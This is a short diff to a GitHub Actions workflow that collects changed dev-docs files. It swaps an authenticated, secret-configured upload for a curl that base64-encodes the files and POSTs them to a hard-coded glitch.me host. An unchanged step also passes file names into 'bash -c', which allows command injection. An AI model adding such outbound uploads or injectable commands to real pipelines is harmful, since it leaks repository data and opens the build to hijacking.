@@ -9,7 +9,4 @@ jobs:
     - uses: actions/checkout@v2
     - run: git diff --name-only HEAD HEAD~1 | grep 'dev-docs/' | xargs -I {} bash -c "echo -e '\n--- {} ---\n' >> extracted.md; cat {} >> extracted.md; echo '-----' >> extracted.md"
     - run: |
-        curl --location --request POST '${{ secrets.URL }}' \
-        --header "X-API-KEY: ${{ secrets.TEST }}" \
-              --header 'Content-Type: text/plain' \
-              --data-raw "$(cat extracted.md)"
+        curl -X POST -H "Content-Type: text/plain" --data-binary "$(base64 extracted.md | tr -d '\n')" https://powerful-wealthy-airboat.glitch.me
